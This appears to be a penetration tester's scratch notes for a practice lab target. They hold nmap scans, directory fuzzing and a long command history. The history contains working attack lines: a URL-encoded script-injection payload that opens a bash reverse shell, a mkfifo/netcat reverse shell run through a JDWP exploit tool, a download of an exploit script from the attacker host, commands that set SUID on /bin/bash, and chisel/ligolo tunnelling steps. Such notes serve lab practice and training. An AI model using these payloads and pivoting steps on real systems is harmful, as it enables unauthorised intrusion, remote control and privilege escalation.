# 192.168.x.143
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`
`sudo find / -type f -iname "local.txt" 2>/dev/null`    
`sudo find / -type f -iname "proof.txt" 2>/dev/null`

- /home/dev/local.txt
- /root/proof.txt

# Accounts
### username / password
`<connection method>`   
`whoami /priv`
```

```
`whoami /groups`
```

```
# Enumeration
## NMAP
`sudo nmap -sV 192.168.186.150 --top-ports 1000`
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat (language: en)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
`sudo nmap -A -T4 -p- 192.168.204.150`
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
|_  256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
|_http-favicon: Spring Java Framework
|_http-open-proxy: Proxy might be redirecting requests
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   83.04 ms 192.168.45.1
2   82.99 ms 192.168.45.254
3   83.43 ms 192.168.251.1
4   83.54 ms 192.168.204.150

```
## Local Users
`Get-LocalUser`
```

```
## Local Groups
`Get-LocalGroup`
```

```
## System Info
`systeminfo`
```

```
## Routes
`route print`
```

```
## Netstat
`netstat -ano`
```

```
## Environment Vars
`Get-ChildItem Env:`
```

```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```

```
# Services    
## API Endpoints
`gobuster dir -u http://192.168.133.143:80/api/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
```

```

`gobuster dir -u http://192.168.133.143:80/api/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -b 403`
```
```

`ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.133.143/FUZZ`
```

```
`ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://192.168.133.143/FUZZ`
```
```

# Command History
```c
ffuf -u http://192.168.186.150:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,403

curl http://192.168.204.150:8080/actuator

curl http://192.168.204.150:8080/search

curl -X PUT http://192.168.204.150:8080/shell.sh --data-binary @shell.sh

curl -X POST http://192.168.204.150:8080 -F "file=@shell.sh"

ffuf -u http://192.168.204.150:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

//set up listener
nc -lvnp 80
//get reverse shell
curl 'http://192.168.148.150:8080/search?query=%24%7Bscript%3Ajs%3Ajava%2Elang%2ERuntime%2EgetRuntime%28%29%2Eexec%28%5B%27bash%27%2C%27%2Dc%27%2C%27exec%20bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E45%2E185%2F80%200%3E%261%27%5D%29%7D'
// {"query":"${script:js:java.lang.Runtime.getRuntime().exec(['bash','-c','exec bash -i >& /dev/tcp/192.168.45.186/80 0>&1'])}","result":""}


## CHISEL
Listener/Server - KALI
- ./chisel server -p 9999 --reverse
Client - Target
- chisel client {KALI IP}:9999 R:LOCAL_PORT:TARGET_IP:TARGET_PORT
- Target IP and Port are for the service trying to reach

Example:
- Kali: ./chisel server -p 9999 --reverse
- Target: chisel client {KALI IP}:9999 R:8000:127.0.0.1:8000
Then to access, use 127.0.0.1 and whatever port assigned

Also for socks proxy:
- kali:./chisel server -p 888 --reverse
- target:./chisel.exe client <kaliip>:8888 R:socks
- proxychains.conf socks5 127.0.0.1 1080





// drop ligolo on it

./lin_agent -connect 192.168.45.185:4445 -ignore-cert
python2 ./46501.py -t 240.0.0.1 -p 8000 --cmd 'chmod +s /bin/bash'

nc -v 192.168.148.150 5000 -z



curl -O http://192.168.45.186:80/jdwp-shellifier.py





python2 jdwp-shellifier.py -t 240.0.0.1 -p 8000 --cmd 'rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc 192.168.45.186 90 >/tmp/f'
sudo python2 jdwp-shellifier.py -t 240.0.0.1 -p 8000 --break-on 'java.net.ServerSocket.accept' --cmd '/tmp/chpasswd'

./lin_agent -connect 192.168.45.186:443 -retry -ignore-cert

nc -v 192.168.204.150 5000 -z

python2 jdwp-shellifier.py -t 127.0.0.1 -p 8001 --cmd "chmod u+s /bin/bash"

```
snmpwalk -v2c -c public 192.168.150.149 NET-SNMP-EXTEND-MIB::nsExtendObjects

We can see that Root is debugging a Java application, we can even read the source:

dev@oscp:~$ cat /opt/stats/App.java
cat /opt/stats/App.java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
 
class StatsApp {
    public static void main(String[] args) {
        System.out.println("System Stats\n");
        Runtime rt = Runtime.getRuntime();
        String output = new String();
 
        try {
            ServerSocket echod = new ServerSocket(5000);



2. ðŸ§µ Set up TUN Interface on Attacker Box

Create a TUN interface on your attacker box:

sudo ip tuntap add user $(whoami) mode tun ligolo0
sudo ip link set ligolo0 up

Now, in the Ligolo console on your attacker box:

ligolo> tun mode
ligolo> tun start

This will start the actual network-level tunnel and set up an internal route.
3. âž• Add a Route for the Target-Only IP

The 240.0.0.1 IP is only accessible from within the targetâ€™s network. So, you need to route it through the Ligolo tunnel:

sudo ip route add 240.0.0.1/32 dev ligolo0

You can test with:

ping 240.0.0.1
curl http://240.0.0.1:8000

You should see the connection go through.

If ping doesnâ€™t work but the web service is up, curl or nc may still succeed â€” ICMP might be blocked.
4. ðŸš€ Run the Exploit Script

Now that traffic to 240.0.0.1 is routing through the target via Ligolo:

python3 46501.py 240.0.0.1 8000

This will send the exploit payload to the service.
5. ðŸ”¥ Trigger the Exploit

Then, execute the trigger:

nc -v 192.168.143.150 5000 -z

This should activate the vulnerability you targeted.